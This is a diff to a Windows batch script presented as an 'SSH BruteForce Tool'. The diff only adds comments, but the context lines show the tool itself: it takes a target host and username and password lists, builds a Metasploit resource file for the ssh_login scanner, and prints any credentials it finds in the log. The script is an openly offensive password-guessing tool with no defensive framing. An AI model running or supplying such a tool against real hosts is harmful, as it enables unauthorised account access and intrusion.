@@ -27,17 +27,20 @@ if %errorlevel% == 0 (
 )
 title SSH tool
 color 0a
+:: main menu
 echo =====================================================================
 echo  Author:              Soggal1ng
 echo  Description:    SSH BruteForce Tool
 echo  Version:                1.0
 echo ======================================================================
+:: inputs
 echo Enter Target IP Address or Hostname:
 set /p target=">> "
 echo Enter Username List:
 set /p userlist=">> "
 echo Enter Password List:
 set /p passlist=">> "
+:: making the .rc file for the metasploit payload
 echo use auxiliary/scanner/ssh/ssh_login > ssh.rc
 echo set RHOSTS %target% >> ssh.rc
 echo set USER_FILE %userlist% >> ssh.rc
@@ -69,6 +72,7 @@ for /f "tokens=*" %%a in (ssh.log) do (
 )
 :done
 :skip
+:: ending output
 echo ======================================================================
 echo Username: %user%
 echo Password: %pass%
